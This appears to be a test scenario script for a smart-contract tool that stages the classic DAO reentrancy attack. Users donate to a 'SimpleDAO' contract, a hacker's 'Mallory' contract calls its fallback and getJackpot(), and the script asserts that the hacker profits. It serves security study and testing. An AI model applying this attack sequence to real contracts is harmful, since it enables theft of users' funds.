
account{balance:10ether} owner;
account{balance:50ether} user1;
account{balance:50ether} user2;
account{balance:50ether} user3;
account{balance:1ether} hacker;

account{contract:"dao.sol", by:owner} dao("SimpleDAO");

dao.donate(user1) {by:user1, value:1ether};
dao.donate(user2) {by:user2, value:5ether};
dao.donate(user3) {by:user3, value:10ether};

account{contract:"dao.sol", by:hacker} mallory("Mallory", dao);

dao.donate(mallory) {by:hacker, value:1ether};

mallory.() {by:hacker, value:0ether};

mallory.getJackpot() {by:hacker};

assert hacker.balance > 1ether;
